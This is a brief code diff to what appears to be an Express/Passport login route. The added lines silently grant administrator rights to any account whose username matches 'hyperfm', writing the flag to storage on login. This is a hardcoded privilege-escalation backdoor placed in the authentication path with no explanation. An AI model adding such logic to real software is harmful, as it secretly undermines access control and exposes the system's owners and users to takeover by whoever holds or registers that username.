@@ -182,7 +182,11 @@ export async function registerRoutes(
     }
   });
 
-  app.post(api.auth.login.path, passport.authenticate("local"), (req, res) => {
+  app.post(api.auth.login.path, passport.authenticate("local"), async (req, res) => {
+    if (req.user && req.user.username.toLowerCase() === "hyperfm" && !req.user.isAdmin) {
+      await storage.setAdmin(req.user.id, true);
+      req.user.isAdmin = true;
+    }
     res.status(200).json(req.user);
   });
 
